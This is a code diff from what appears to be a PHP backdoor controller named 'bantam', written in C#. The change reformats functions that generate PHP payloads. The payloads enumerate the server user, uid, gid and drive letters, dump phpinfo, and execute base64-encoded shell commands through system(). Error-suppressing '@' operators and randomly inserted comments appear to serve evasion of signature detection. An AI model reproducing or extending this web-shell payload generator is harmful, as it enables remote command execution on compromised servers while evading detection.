@@ -234,29 +234,18 @@ namespace bantam.Classes
             }
 
             return linesRandomized 
-                + "if (!function_exists('posix_getegid')) {"
-                + RandomPHPComment()
-                + userVar + " = @get_current_user();"
-                + RandomPHPComment()
-                + uidVar + " = @getmyuid();"
-                + RandomPHPComment()
-                + gidVar + " = @getmygid();"
-                + RandomPHPComment()
-                + groupVar + " = '?';"
-                + RandomPHPComment()
+                + "if (!function_exists('posix_getegid')) {" + RandomPHPComment()
+                + userVar + " = @get_current_user();" + RandomPHPComment()
+                + uidVar + " = @getmyuid();" + RandomPHPComment()
+                + gidVar + " = @getmygid();" + RandomPHPComment()
+                + groupVar + " = '?';" + RandomPHPComment()
                 + "} else {"
-                + uidVar + " = @posix_getpwuid(posix_geteuid());"
-                + RandomPHPComment()
-                + gidVar + " = @posix_getgrgid(posix_getegid());"
-                + RandomPHPComment()
-                + userVar + "= " + uidVar + "['name'];"
-                + RandomPHPComment()
-                + uidVar + " = " + uidVar + "['uid'];"
-                + RandomPHPComment()
-                + gidVar + " = " + gidVar + "['gid'];"
-                + RandomPHPComment()
-                + groupVar + " = " + gidVar + "['name'];"
-                + RandomPHPComment()
+                + uidVar + " = @posix_getpwuid(posix_geteuid());" + RandomPHPComment()
+                + gidVar + " = @posix_getgrgid(posix_getegid());" + RandomPHPComment()
+                + userVar + "= " + uidVar + "['name'];" + RandomPHPComment()
+                + uidVar + " = " + uidVar + "['uid'];" + RandomPHPComment()
+                + gidVar + " = " + gidVar + "['gid'];" + RandomPHPComment()
+                + groupVar + " = " + gidVar + "['name'];" + RandomPHPComment()
                 + "}"
                 + responseCode
                 + RandomPHPComment();
@@ -365,14 +354,10 @@ namespace bantam.Classes
         {
             if (encryptResponse) {
                 return RandomPHPComment()
-                      + "@ob_start();"
-                      + RandomPHPComment()
-                      + "@phpinfo();"
-                      + RandomPHPComment()
-                      + "$result = @ob_get_contents();"
-                      + RandomPHPComment()
-                      + "@ob_end_clean();"
-                      + RandomPHPComment();
+                      + "@ob_start();"+ RandomPHPComment()
+                      + "phpinfo();"+ RandomPHPComment()
+                      + "$result = @ob_get_contents();" + RandomPHPComment()
+                      + "@ob_end_clean();"  + RandomPHPComment();
             } else {
                 return RandomPHPComment()
                        + "phpinfo();"
@@ -413,24 +398,16 @@ namespace bantam.Classes
 
             if (encryptResponse) {
                 getHardDriveLetters = RandomPHPComment()
-                                        + "$result=''; foreach (range('a', 'z') as " + driveVar + ") {"
-                                    + RandomPHPComment()
-                                        + "if (is_dir(" + driveVar + @". ':\\')) { "
-                                    + RandomPHPComment()
-                                        + "$result .= " + driveVar + ".':|';"
-                                    + RandomPHPComment()
-                                        + "}}"
-                                    + RandomPHPComment();
+                                    + "$result=''; foreach (range('a', 'z') as " + driveVar + ") {" + RandomPHPComment()
+                                    + "if (is_dir(" + driveVar + @". ':\\')) { " + RandomPHPComment()
+                                    + "$result .= " + driveVar + ".':|';" + RandomPHPComment()
+                                    + "}}" + RandomPHPComment();
             } else {
                 getHardDriveLetters = RandomPHPComment()
-                                        + "foreach (range('a', 'z') as " + driveVar + ") {"
-                                    + RandomPHPComment()
-                                        + "if (is_dir(" + driveVar + @". ':\\')) {"
-                                    + RandomPHPComment()
-                                        + "echo " + driveVar + ".':|';"
-                                    + RandomPHPComment()
-                                        + "}}"
-                                    + RandomPHPComment();
+                                    + "foreach (range('a', 'z') as " + driveVar + ") {" + RandomPHPComment()
+                                    + "if (is_dir(" + driveVar + @". ':\\')) {" + RandomPHPComment()
+                                    + "echo " + driveVar + ".':|';" + RandomPHPComment()
+                                    + "}}" + RandomPHPComment();
             }
             return getHardDriveLetters;
         }
@@ -536,14 +513,10 @@ namespace bantam.Classes
             code = Helper.EncodeBase64ToString(code);
             if (encryptResponse) {
                 return RandomPHPComment()
-                    + "@ob_start();"
-                    + RandomPHPComment()
-                    + "@system(base64_decode('" + code + "'));"
-                    + RandomPHPComment()
-                    + "$result = @ob_get_contents();"
-                    + RandomPHPComment()
-                    + "@ob_end_clean();"
-                    + RandomPHPComment();
+                    + "@ob_start();" + RandomPHPComment()
+                    + "@system(base64_decode('" + code + "'));" + RandomPHPComment()
+                    + "$result = @ob_get_contents();" + RandomPHPComment()
+                    + "@ob_end_clean();" + RandomPHPComment();
             } else {
                 return RandomPHPComment() + "@system(base64_decode('" + code + "'));" + RandomPHPComment();
             }
